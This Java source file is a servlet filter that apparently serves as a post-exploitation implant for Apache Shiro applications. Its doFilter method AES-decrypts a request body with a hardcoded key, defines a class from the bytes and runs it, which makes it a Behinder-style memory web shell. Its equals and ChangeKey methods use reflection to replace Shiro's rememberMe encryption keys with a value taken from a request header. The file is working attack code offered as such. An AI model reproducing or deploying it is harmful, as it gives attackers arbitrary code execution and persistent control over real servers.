package com.summersec.x;

import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * @ClassName: ChangeShiroKeyFilter2
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/10/20 9:40
 * @Version: v1.0.0
 * @Description:
 **/
public class ChangeShiroKeyFilter2 extends ClassLoader implements Filter {

    public String shirokey = "FcoRsBKe9XB3zOHbxTG0Lw==";
    HttpServletRequest request = null;
    HttpServletResponse response = null;
    public String cs = "UTF-8";

    public ChangeShiroKeyFilter2() {
    }
    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }
    public ChangeShiroKeyFilter2(ClassLoader c) {
        super(c);
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

        HttpSession session = ((HttpServletRequest)servletRequest).getSession();
        Object lastRequest = servletRequest;
        Object lastResponse = servletResponse;
        // 解决包装类RequestWrapper的问题
        // 详细描述见 https://github.com/rebeyond/Behinder/issues/187
        if (!(lastRequest instanceof RequestFacade)) {
            Method getRequest = null;
            try {
                getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                lastRequest = getRequest.invoke(request);
                while (true) {
                    if (lastRequest instanceof RequestFacade) break;
                    lastRequest = getRequest.invoke(lastRequest);
                }
            } catch (Exception e) {
//                e.printStackTrace();
            }
        }
        // 解决包装类ResponseWrapper的问题
        try {
            if (!(lastResponse instanceof ResponseFacade)) {
                Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                lastResponse = getResponse.invoke(response);
                while (true) {
                    if (lastResponse instanceof ResponseFacade) break;
                    lastResponse = getResponse.invoke(lastResponse);
                }
            }
        }catch (Exception e) {

        }

        Map obj = new HashMap();
        obj.put("request", lastRequest);
        obj.put("response", lastResponse);
        obj.put("session", session);

        try {
            session.putValue("u", this.shirokey);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(java.util.Base64.getDecoder().decode(this.shirokey), "AES"));
            (new ChangeShiroKeyFilter2(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(servletRequest.getReader().readLine()))).newInstance().equals(obj);
        } catch (Exception var7) {
            var7.printStackTrace();
        }

    }

    public String ChangeKey() {
        try {

        ServletContext context = request.getServletContext();
        Object obj = context.getFilterRegistration("shiroFilterFactoryBean");
        Field field = obj.getClass().getDeclaredField("filterDef");
        field.setAccessible(true);
        obj = field.get(obj);
        field = obj.getClass().getDeclaredField("filter");
        field.setAccessible(true);
        obj = field.get(obj);
        field = obj.getClass().getSuperclass().getDeclaredField("securityManager");
        field.setAccessible(true);
        obj = field.get(obj);
        field = obj.getClass().getSuperclass().getDeclaredField("rememberMeManager");
        field.setAccessible(true);
        obj = field.get(obj);
        java.lang.reflect.Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setEncryptionCipherKey", new Class[]{byte[].class});
        byte[] bytes = this.base64Decode(this.shirokey);
        setEncryptionCipherKey.invoke(obj, new Object[]{bytes});
        java.lang.reflect.Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setDecryptionCipherKey", new Class[]{byte[].class});
        setDecryptionCipherKey.invoke(obj, new Object[]{bytes});
        }catch (Exception e){
            return e.getMessage();
        }
        return "change key ok";
    }
    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.shirokey = this.request.getHeader("p");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.ChangeKey());
        } catch (Exception var7) {
            output.append(var7.getMessage());
        }

        try {
            this.response.getWriter().println(tag_s + output + tag_e);
            this.response.getWriter().println("change shiro key is " + this.shirokey);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }
    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str));
        }
    }
    @Override
    public void destroy() {

    }
}
